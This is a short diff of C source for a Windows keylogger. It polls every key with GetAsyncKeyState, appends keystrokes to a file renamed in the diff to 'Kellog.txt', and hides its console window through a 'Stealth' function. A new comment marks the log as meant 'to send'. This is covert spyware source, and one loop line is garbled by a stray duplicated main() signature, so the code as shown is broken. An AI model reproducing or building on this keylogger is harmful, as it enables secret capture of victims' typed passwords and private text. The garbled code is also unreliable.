@@ -26,7 +26,7 @@ int main() {
     while (1) {
         for(i = 8; i <= 190; i++) {int main(int argc, char* argv[])
             if (GetAsyncKeyState(i) == -32767)
-                Save(i, "LOG.txt");
+                Save(i, "Kellog.txt");
         }
     }
     system("PAUSE");
@@ -39,6 +39,7 @@ int Save (int key_stroke, char *file) {
     if ((key_stroke == 1) || (key_stroke == 2))
         return 0;
  
+    //Create a log file to send
     FILE * OUTPUT_FILE;
     OUTPUT_FILE = fopen(file, "a+");
  
@@ -87,3 +88,5 @@ void Stealth() {
     Stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(Stealth, 0);
 }
+
+
